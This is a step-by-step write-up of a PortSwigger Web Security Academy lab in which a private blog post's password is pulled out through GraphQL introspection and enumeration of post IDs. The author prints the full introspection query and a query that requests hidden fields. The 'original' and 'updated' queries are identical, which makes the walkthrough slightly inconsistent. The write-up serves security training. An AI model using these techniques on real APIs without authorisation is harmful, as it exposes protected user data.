# Lab 1: Accessing Private GraphQL Posts

**Platform:** PortSwigger Web Security Academy

**Category:** GraphQL API Vulnerabilities (APPRENTICE)

<img width="912" height="162" alt="image" src="https://github.com/user-attachments/assets/a6d71383-3a76-486f-82bd-7b43ae84365d" />

## Lab Description

The blog page for this lab contains a hidden blog post that has a secret password. To solve the lab, find the hidden blog post and enter the password. 


## Steps

### 1. Identifying the GraphQL Endpoint

First, I navigated to any blog post and inspected the application's requests using Burp Suite → Proxy → HTTP history.

I discovered a GraphQL endpoint:

```
POST /graphql/v1 HTTP/2
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/json
```

The original GraphQL request was:

```graphql
query getBlogPost($id: Int!) {
    getBlogPost(id: $id) {
        image
        title
        postPassword
        isPrivate
        author
        date
        paragraphs
    }
}
```

The request used the `id` variable to retrieve a specific blog post.

I sent the request to Burp Suite Repeater.

### 2. Performing GraphQL Introspection

Next, I used the GraphQL extension in Burp Suite and selected the option to set up introspection.

<img width="1207" height="582" alt="image" src="https://github.com/user-attachments/assets/e259cb78-3dc2-4169-921b-926c2e9e60f7" />

Alternatively, I could manually send a full GraphQL introspection query to retrieve the application's schema by using Burp Suite's GraphQL view to edit the query.

The introspection query was:

```graphql
#Full introspection query

    query IntrospectionQuery {
        __schema {
            queryType {
                name
            }
            mutationType {
                name
            }
            subscriptionType {
                name
            }
            types {
             ...FullType
            }
            directives {
                name
                description
                args {
                    ...InputValue
            }
            
            }
        }
    }

    fragment FullType on __Type {
        kind
        name
        description
        fields(includeDeprecated: true) {
            name
            description
            args {
                ...InputValue
            }
            type {
                ...TypeRef
            }
            isDeprecated
            deprecationReason
        }
        inputFields {
            ...InputValue
        }
        interfaces {
            ...TypeRef
        }
        enumValues(includeDeprecated: true) {
            name
            description
            isDeprecated
            deprecationReason
        }
        possibleTypes {
            ...TypeRef
        }
    }

    fragment InputValue on __InputValue {
        name
        description
        type {
            ...TypeRef
        }
        defaultValue
    }

    fragment TypeRef on __Type {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
                ofType {
                    kind
                    name
                }
            }
        }
    }
```

The server returned the GraphQL schema, allowing me to inspect the available types and fields.

### 3. Identifying Interesting Fields

While reviewing the introspection response, I found two interesting fields:

- `isPrivate`
- `postPassword`

These fields caught my attention because the lab description mentioned a hidden private post containing a secret password.

<img width="1262" height="810" alt="image" src="https://github.com/user-attachments/assets/99541513-aee2-4634-9ee2-08079629ed54" />


### 4. Modifying the Original GraphQL Query

I returned to the original request and used Burp Suite's GraphQL view to add the two interesting fields to the selection set.

The updated query was:

```graphql
query getBlogPost($id: Int!) {
    getBlogPost(id: $id) {
        image
        title
        postPassword
        isPrivate
        author
        date
        paragraphs
    }
}
```

By requesting `postPassword` and `isPrivate`, I could inspect whether the returned post was private and whether its password was exposed.

### 5. Enumerating Blog Post IDs

Next, I modified the `id` value inside the GraphQL variables to retrieve different blog posts.

For example:

```json
{
    "id": 1
}
```

Then I changed it to:

```json
{
    "id": 2
}
```

And finally:

```json
{
    "id": 3
}
```

I discovered that the post with ID `3` contained the secret password.

The API returned the password through the `postPassword` field, even though the post was hidden from the public blog page.

<img width="1197" height="717" alt="image" src="https://github.com/user-attachments/assets/92f97650-1b32-44ae-952f-bbd707230582" />


### 6. Retrieving the Password and Solving the Lab

After extracting the password from the GraphQL response, I submitted it by click on the top button.

Alhamdulillah, the lab was solved.

<img width="1853" height="375" alt="Screenshot 2026-11-03 025826" src="https://github.com/user-attachments/assets/9e39ff29-94d5-4569-85f9-d47e8656107c" />


---

**Lab Link:** [Open the lab](https://portswigger.net/web-security/graphql/lab-graphql-reading-private-posts)

See you in the next lab solution, In sha Allah!

سبحانك اللهم وبحمدك، أشهد أن لا إله إلا أنت، أستغفرك وأتوب إليك.
